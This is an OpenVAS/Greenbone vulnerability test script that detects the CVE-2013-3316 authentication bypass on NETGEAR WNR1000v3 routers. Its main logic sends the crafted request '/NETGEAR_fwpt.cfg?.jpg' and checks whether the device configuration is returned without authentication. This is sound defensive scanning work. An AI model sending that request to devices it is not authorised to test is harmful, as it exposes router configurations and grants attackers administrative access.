# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803188");
  script_version("2024-05-30T05:05:32+0000");
  script_tag(name:"last_modification", value:"2024-05-30 05:05:32 +0000 (Thu, 30 May 2024)");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2020-02-01 17:11:00 +0000 (Sat, 01 Feb 2020)");
  script_tag(name:"creation_date", value:"2013-04-05 18:28:47 +0530 (Fri, 05 Apr 2013)");

  script_cve_id("CVE-2013-3316");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("NETGEAR WNR1000v3 'Image' Request Authentication Bypass Vulnerability - Active Check");

  # nb: Crafted request might be already seen as an attack...
  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 8080);
  script_mandatory_keys("netgear/device/banner");

  script_tag(name:"summary", value:"NETGEAR WNR1000v3 devices are prone to an authentication bypass
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The web server skipping authentication for certain requests
  that contain a '.jpg' substring. With a specially crafted URL, a remote attacker can bypass
  authentication and gain access to the device configuration.");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to gain
  administrative access, circumventing existing authentication mechanisms.");

  script_tag(name:"affected", value:"NETGEAR WNR1000v3 devices with firmware version prior to
  1.0.2.60. Other models might be affected as well.");

  script_tag(name:"solution", value:"Update NETGEAR WNR1000v3 devices to firmware version 1.0.2.60
  or later.

  For other models please contact the vendor for more information on possible fixes.");

  script_xref(name:"URL", value:"http://seclists.org/bugtraq/2013/Apr/5");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/24916");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/121025");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");

port = http_get_port(default: 8080);

banner = http_get_remote_headers(port: port);

# nb: In the initial version this VT had checked for:
#
# "NETGEAR WNR1000" >!< banner
#
# probably to catch the following:
#
# WWW-Authenticate: Basic realm="NETGEAR WNR1000v3"
#
# This was now made more lax as there might be different NETGEAR devices affected as well...
if (!banner || "NETGEAR" >!< banner)
  exit(0);

url = "/NETGEAR_fwpt.cfg?.jpg";
pattern = "^[Cc]ontent-[Tt]ype\s*:\s*application/configuration";

# A fixed system is responding with:
#
# HTTP/1.0 401 Unauthorized
# WWW-Authenticate: Basic realm="NETGEAR WNR1000v3"
# Content-type: text/html
#
# <html>
# <head>
# <meta http-equiv='Content-Type' content='text/html; charset=utf-8'>
# <title>401 Unauthorized</title></head>
# <body onload="document.aForm.submit()"><h1>401 Unauthorized</h1>
# <p>Access to this resource is denied, your client has not supplied the correct authentication.</p><form method="post" action="unauth.cgi?id=720989688" name="aForm"></form></body>
# </html>
#
# while an affected system is responding with:
#
# HTTP/1.0 200 OK
# Content-length: 24600
# Content-type: application/configuration
#
# and a binary blob in the body.
#
if (res = http_vuln_check(port: port, url: url, icase: FALSE, pattern: pattern, check_header: TRUE,
                          extra_check: "^[Cc]ontent-[Ll]ength\s*:\s*[0-9]+")) {
  report = http_report_vuln_url(port:port, url:url);

  # nb: Just some additional reporting for the end-user etc...
  concl = egrep(string: res, pattern: pattern, icase: FALSE);
  concl = chomp(concl);
  if (concl)
    report += '\nConfirmation via: ' + concl;

  concl = egrep(string: banner, pattern: "NETGEAR", icase: FALSE);
  concl = chomp(concl);
  if (concl)
    report += '\nDevice type / info: ' + concl;

  security_message(port:port, data:report);
  exit(0);
}

exit(99);
